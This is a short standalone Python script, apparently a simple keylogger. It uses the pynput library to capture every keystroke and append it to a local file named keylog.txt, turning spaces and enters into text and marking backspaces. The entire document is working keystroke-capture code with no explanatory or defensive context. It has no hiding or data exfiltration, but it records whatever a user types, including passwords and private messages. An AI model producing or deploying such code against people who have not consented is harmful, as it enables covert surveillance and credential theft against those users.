from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Write letters, numbers, and symbols
            elif key == keyboard.Key.space:
                f.write(" ")  # Convert [Key.space] to a space
            elif key == keyboard.Key.enter:
                f.write("\n")  # Convert [Key.enter] to a new line
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")  # Log backspace without deleting text
            # Ignore special keys like Ctrl, Shift, Alt, etc.
    except Exception as e:
        print(f"Error: {e}")

# Start listening for key presses
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger running... Press Ctrl+C to stop.")
    listener.join()
